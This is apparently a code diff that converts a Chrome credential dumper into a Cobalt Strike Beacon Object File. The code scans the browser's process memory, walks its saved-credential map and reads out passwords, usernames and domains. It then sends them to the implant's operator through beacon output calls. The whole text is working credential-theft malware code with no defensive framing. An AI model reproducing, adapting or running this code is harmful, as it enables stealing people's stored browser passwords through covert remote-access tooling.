@@ -1,11 +1,4 @@
-#include <Windows.h>
-#include <string>
-#include <map>
-#include <memory>
-#include <vector>
-
-#include "Helper.h"
-#include "Memory.h"
+#include <cstdint>
 
 struct WideOptimizedString {
     wchar_t buf[11];
@@ -66,114 +59,116 @@ struct RootNode {
 
 //Since Chrome uses std::string type a lot, we need to take into account if the string has been optimized to use Small String Optimization
 //Or if it is stored in another address
-void ReadWideString(HANDLE hProcess, WideOptimizedString string) {
+void ReadWideString(HANDLE hProcess, WideOptimizedString string, formatp* buffer) {
 
     if (string.len > 11)
     {
         RemoteString longString = { 0 };
-        std::memcpy(&longString, &string.buf, sizeof(RemoteString));
+        memcpy(&longString, &string.buf, sizeof(RemoteString));
 
         if (longString.dataAddress != 0) {
 #ifdef _DEBUG
-            PRINT("Attempting to read the credential value from address: 0x%p\n", (void*)longString.dataAddress);
+            BeaconPrintf(CALLBACK_OUTPUT, "Attempting to read the credential value from address: 0x%p\n", (void*)longString.dataAddress);
 #endif
             wchar_t* buf = (wchar_t*)malloc((longString.strMax + 1) * 2);
-            if (buf == 0 || !ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(longString.dataAddress), buf, (longString.strLen + 1)*2, nullptr)) {
-                DEBUG_PRINT_ERROR_MESSAGE(TEXT("Failed to read credential value"));
+            if (buf == 0 || !ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(longString.dataAddress), buf, (longString.strLen + 1) * 2, nullptr)) {
+                BeaconPrintf(CALLBACK_ERROR, "Failed to read credential value", GetLastError());
                 free(buf);
                 return;
             }
-            PRINT("%ls\n", buf);
+            BeaconFormatPrintf(buffer, "%ls\n", buf);
             free(buf);
         }
     }
     else
-        PRINT("%ls\n", string.buf);
+        BeaconFormatPrintf(buffer, "%ls\n", string.buf);
 
 }
 
-void ReadString(HANDLE hProcess, OptimizedString string) {
+void ReadString(HANDLE hProcess, OptimizedString string, formatp* buffer) {
 
     if (string.len > 23)
     {
         RemoteString longString = { 0 };
-        std::memcpy(&longString, &string.buf, sizeof(RemoteString));
+        memcpy(&longString, &string.buf, sizeof(RemoteString));
 
         if (longString.dataAddress != 0) {
 #ifdef _DEBUG
-            PRINT("Attempting to read the credential value from address: 0x%p\n", (void*)longString.dataAddress);
+            BeaconPrintf(CALLBACK_OUTPUT, "Attempting to read the cookie value from address: 0x%p\n", (void*)longString.dataAddress);
 #endif
             unsigned char* buf = (unsigned char*)malloc(longString.strMax);
             if (buf == 0 || !ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(longString.dataAddress), buf, longString.strLen + 1, nullptr)) {
-                DEBUG_PRINT_ERROR_MESSAGE(TEXT("Failed to read credential value"));
+                BeaconPrintf(CALLBACK_ERROR, "Failed to read cookie value", GetLastError());
                 free(buf);
                 return;
             }
-            PRINT("%s\n", buf);
+            BeaconFormatPrintf(buffer, "%s\n", buf);
             free(buf);
         }
     }
     else
-        PRINT("%s\n", string.buf);
+        BeaconFormatPrintf(buffer, "%s\n", string.buf);
 
 }
 
-void PrintValues(MatchingReusedCredential creds, HANDLE hProcess) {
-    PRINT("    Name: ");
-    ReadWideString(hProcess, creds.username);
-    PRINT("    Domain: ");
-    ReadString(hProcess, creds.domain);
+void PrintValues(MatchingReusedCredential creds, HANDLE hProcess, formatp* buffer) {
+    BeaconFormatPrintf(buffer, "    Name: ");
+    ReadWideString(hProcess, creds.username, buffer);
+    BeaconFormatPrintf(buffer, "    Domain: ");
+    ReadString(hProcess, creds.domain, buffer);
     if (creds.credentialStore == Store::kNotSet)
-        PRINT("    CredentialStore: NotSet");
+        BeaconFormatPrintf(buffer, "    CredentialStore: NotSet");
     else if (creds.credentialStore == Store::kAccountStore)
-        PRINT("    CredentialStore: AccountStore");
+        BeaconFormatPrintf(buffer, "    CredentialStore: AccountStore");
     else if (creds.credentialStore == Store::kProfileStore)
-        PRINT("    CredentialStore: ProfileStore");
+        BeaconFormatPrintf(buffer, "    CredentialStore: ProfileStore");
     else if (creds.credentialStore == Store::kMaxValue)
-        PRINT("    CredentialStore: MaxValue");
-    else 
-        PRINT("    CredentialStore: Error!");
+        BeaconFormatPrintf(buffer, "    CredentialStore: MaxValue");
+    else
+        BeaconFormatPrintf(buffer, "    CredentialStore: Error!");
 
-    PRINT("\n\n");
+    BeaconFormatPrintf(buffer, "\n\n");
 }
 
-void ProcessNodeValue(HANDLE hProcess, uintptr_t Valueaddr) {
+void ProcessNodeValue(HANDLE hProcess, uintptr_t Valueaddr, formatp* buffer) {
 
     MatchingReusedCredential creds = { 0 };
     if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &creds, sizeof(MatchingReusedCredential), nullptr)) {
-        DEBUG_PRINT_ERROR_MESSAGE(TEXT("Failed to read credential struct"));
+        BeaconPrintf(CALLBACK_ERROR, "Failed to read credential struct", GetLastError());
         return;
     }
-    PrintValues(creds, hProcess);
+    PrintValues(creds, hProcess, buffer);
 }
 
-void ProcessNode(HANDLE hProcess, const Node& node) {
+void ProcessNode(HANDLE hProcess, const Node& node, formatp* buffer, int* bufsize) {
     // Process the current node
-    PRINT("Credential entry:\n");
-    PRINT("    Password: ");
-    ReadWideString(hProcess, node.key);
+    BeaconFormatReset(buffer);
+    BeaconFormatPrintf(buffer, "Credential entry:\n");
+    BeaconFormatPrintf(buffer, "    Password: ");
+    ReadWideString(hProcess, node.key, buffer);
 
 #ifdef _DEBUG
-    PRINT("Attempting to read credential values from address:  0x%p\n", (void*)node.valueAddress);
+    BeaconPrintf(CALLBACK_OUTPUT, "Attempting to read credential values from address:  0x%p\n", (void*)node.valueAddress);
 #endif
-    ProcessNodeValue(hProcess, node.valueAddress);
+    ProcessNodeValue(hProcess, node.valueAddress, buffer);
+    BeaconOutput(CALLBACK_OUTPUT, BeaconFormatToString(buffer, bufsize), *bufsize);
 
     // Process the left child if it exists
     if (node.left != 0) {
         Node leftNode;
         if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(node.left), &leftNode, sizeof(Node), nullptr))
-            ProcessNode(hProcess, leftNode);
+            ProcessNode(hProcess, leftNode, buffer ,bufsize);
         else
-            DEBUG_PRINT_ERROR_MESSAGE(TEXT("Error reading left node"));
+            BeaconPrintf(CALLBACK_ERROR, "Error reading left node", GetLastError());
     }
 
     // Process the right child if it exists
     if (node.right != 0) {
         Node rightNode;
         if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(node.right), &rightNode, sizeof(Node), nullptr))
-            ProcessNode(hProcess, rightNode);
+            ProcessNode(hProcess, rightNode, buffer, bufsize);
         else
-            DEBUG_PRINT_ERROR_MESSAGE(TEXT("Error reading right node"));
+            BeaconPrintf(CALLBACK_ERROR, "Error reading right node", GetLastError());
     }
 }
 
@@ -181,31 +176,38 @@ void WalkCredentialMap(HANDLE hProcess, uintptr_t credentialMapAddress) {
 
     RootNode credentialMap;
     if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(credentialMapAddress), &credentialMap, sizeof(RootNode), nullptr)) {
-        DEBUG_PRINT_ERROR_MESSAGE(TEXT("Failed to read the root node from given address\n"));
+        BeaconPrintf(CALLBACK_ERROR, "Failed to read the root node from given address\n", GetLastError());
         return;
     }
 
     // Process the root node
 #ifdef _DEBUG
-    PRINT("Address of beginNode: 0x%p\n", (void*)credentialMap.beginNode);
-    PRINT("Address of firstNode: 0x%p\n", (void*)credentialMap.firstNode);
-    PRINT("Size of the credential map: %Iu\n", credentialMap.size);
+    BeaconPrintf(CALLBACK_OUTPUT, "Address of beginNode: 0x%p\n", (void*)credentialMap.beginNode);
+    BeaconPrintf(CALLBACK_OUTPUT, "Address of firstNode: 0x%p\n", (void*)credentialMap.firstNode);
+    BeaconPrintf(CALLBACK_OUTPUT, "Size of the credential map: %Iu\n", credentialMap.size);
 #endif // _DEBUG
 
-    PRINT("[*] Number of available credentials: %Iu\n\n", credentialMap.size);
+    BeaconPrintf(CALLBACK_OUTPUT, "Number of available credentials: %Iu\n\n", credentialMap.size);
 
     if (credentialMap.firstNode == 0) //CookieMap was empty
     {
-        PRINT("[*] This credential map was empty\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "This credential map was empty\n");
         return;
     }
 
     // Process the first node in the binary search tree
     Node firstNode;
-    if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(credentialMap.firstNode), &firstNode, sizeof(Node), nullptr) && &firstNode != nullptr)
-        ProcessNode(hProcess, firstNode);
+    if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(credentialMap.firstNode), &firstNode, sizeof(Node), nullptr) && &firstNode != nullptr) {
+        formatp buffer;
+        int bufsize = 5 * 1024;
+        BeaconFormatAlloc(&buffer, bufsize); // RFC 6265 specifies: "At least 4096 bytes per cookie"
+
+        ProcessNode(hProcess, firstNode, &buffer, &bufsize);
+
+        BeaconFormatFree(&buffer);
+    }
     else
-        DEBUG_PRINT_ERROR_MESSAGE(TEXT("Error reading first node\n"));
+        BeaconPrintf(CALLBACK_ERROR, "Error reading first node\n", GetLastError());
 }
 
 BOOL MyMemCmp(BYTE* source, const BYTE* searchPattern, size_t num) {
@@ -257,7 +259,7 @@ BOOL FindPattern(HANDLE hProcess, const BYTE* pattern, size_t patternSize, uintp
     while (startAddress < endAddress) {
         if (VirtualQueryEx(hProcess, reinterpret_cast<LPCVOID>(startAddress), &memoryInfo, sizeof(memoryInfo)) == sizeof(memoryInfo)) {
             if (memoryInfo.State == MEM_COMMIT && (memoryInfo.Protect & PAGE_READWRITE) != 0 && memoryInfo.Type == MEM_PRIVATE) {
-                BYTE* buffer = new BYTE[memoryInfo.RegionSize];
+                BYTE* buffer = (BYTE*)malloc(sizeof(BYTE) * memoryInfo.RegionSize);
                 SIZE_T bytesRead;
 
                 BYTE* newPattern = PatchBaseAddress(pattern, patternSize, reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress));
@@ -288,10 +290,11 @@ BOOL FindPattern(HANDLE hProcess, const BYTE* pattern, size_t patternSize, uintp
                     }
                 }
                 else {
-                    DEBUG_PRINT_ERROR_MESSAGE(TEXT("ReadProcessMemory failed\n"));
+                    //This happens quite a lot, will not print these errors on release build
+                    //DEBUG_PRINT_ERROR_MESSAGE(TEXT("ReadProcessMemory failed\n"));
                 }
                 free(newPattern);
-                delete[] buffer;
+                free(buffer);
             }
 
             startAddress += memoryInfo.RegionSize;
